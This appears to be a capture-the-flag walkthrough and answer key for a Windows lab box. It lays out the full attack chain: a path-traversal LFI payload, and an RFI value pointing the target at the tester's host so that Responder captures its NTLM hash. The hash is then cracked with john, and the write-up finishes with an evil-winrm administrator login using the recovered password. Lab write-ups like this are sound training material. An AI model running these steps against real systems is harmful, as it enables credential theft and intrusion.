# Questions

## When visiting the web service using the IP address, what is the domain that we are being redirected to?
- _unika.htb_

## Which scripting language is being used on the server to generate webpages?
- php

## What is the name of the URL parameter which is used to load different language versions of the webpage?
- click on "EN" and select a language to see

## Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
- _../../../../../../../../windows/system32/drivers/etc/hosts_

## Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
- _//10.10.14.6/somefile_

## What does NTLM stand for?
- New Technology LAN Manager

## Which flag do we use in the Responder utility to specify the network interface?
- `-i`

## There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
- find LFI in `page` param
    - `page=../../../../../../../../windows/system32/drivers/etc/hosts`
- capture NTLM hash of our adm using Responder
    - `sudo responder -I tun0`
```
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.4]
    Responder IPv6             [dead:beef:4::1002]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']
```
- send this request with `responder` active 
    - `page=//10.10.16.4/somefile`
- get the hash and crack with john
    - `john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
    - badminton
- tool name: `john the ripper`

## What is the password for the administrator user?
- badminton

## We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
- `sudo nmap $IP -p- -T4 -sC -sV -Pn`
- 5985

## Submit root flag
- `evil-winrm -u administrator -p badminton -i unika.htb`
- `*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt`
